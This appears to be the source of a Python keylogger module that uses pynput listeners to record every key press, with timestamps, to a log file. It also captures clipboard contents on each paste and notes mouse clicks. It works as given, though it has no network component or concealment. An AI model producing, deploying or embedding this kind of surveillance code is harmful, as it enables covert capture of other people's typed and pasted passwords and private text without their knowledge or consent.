from pynput import mouse, keyboard
import clipboard
import os
from datetime import datetime
import sys

# TODO add caps control, maybe change how the logger saves stuff,
# datetime object containing current date and time
now = datetime.now()

# dd/mm/YY H:M:S
dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
# print("date and time =" + dt_string)


caps = False


def on_press(key):
    global caps


    if "x16" in str(key):
        write_file(enter=True)

        try:
            write_file("[PASTED]: " + clipboard.paste() + "\n[END PASTED]")
            write_file(enter=True)
        except:
            write_file(" ")
            write_file(remove=True)

    elif key == keyboard.Key.enter:
        write_file(enter=True)
    elif key == keyboard.Key.space:
        write_file(' ')
    elif key == keyboard.Key.backspace:
        write_file(remove=True)
    elif key == keyboard.Key.caps_lock:
        caps = not caps

    else:
        k = str(key)
        k = k.replace("'", "")
        if k.find("Key") == -1 and k.find("\\x") == -1:
            write_file(k)
    # print(key)



def request_time():
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    return "[" + dt_string + "] "  # remove \n from the start


def write_file(key="", remove=False, enter=False):
    # makes file if log file wasn't made already
    if not os.path.isfile(log_file):
        f = open(log_file, "w")
        f.close()

    # add text process
    with open(log_file, 'r') as f:
        text = f.readlines()
        last_line = text[-1] if len(text) > 0 else ""
        if text.__len__() == 0:
            with open(log_file, 'a') as f:
                f.write(f"\n-------------{request_time()}-------------\n")
        if enter:
            if len(text) == 0:
                return
            if last_line[-1] == "\n":
                return
            with open(log_file, 'a') as f:
                f.write("\n")
                return
        elif remove:
            if len(text) == 0 or last_line[-1] == "\n":
                return
            if last_line.count(" ") <= 2 and last_line[-2] == " " or last_line[-1] == " " and last_line[-2] == " " and last_line.count(" ") <= 3:
                text[-1] = ""
                text = "".join(text)

            else:
                text = "".join(text)
                text = text[:-1]

            with open(log_file, 'w') as f:
                f.write(text)
                return
    with open(log_file, 'a') as f:
        with open(log_file, 'r') as r:
            text = r.read()
            if text[-1] == "\n":
                f.write(request_time())
        f.write(key.upper() if caps else key)


def on_click(x, y, button, pressed):
    if pressed:
        if not os.path.isfile(log_file):
            f = open(log_file, "w")
            f.close()
        with open(log_file, 'r') as f:
            reader = f.read()
            if reader.__len__() != 0:
                if reader[-1] == " ":
                    return
                else:
                    write_file(enter=True)


def start(log_path):
    global log_file
    log_file = log_path
    key_listener = keyboard.Listener(
        on_press=on_press, )
    key_listener.start()

    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()
    return key_listener, mouse_listener
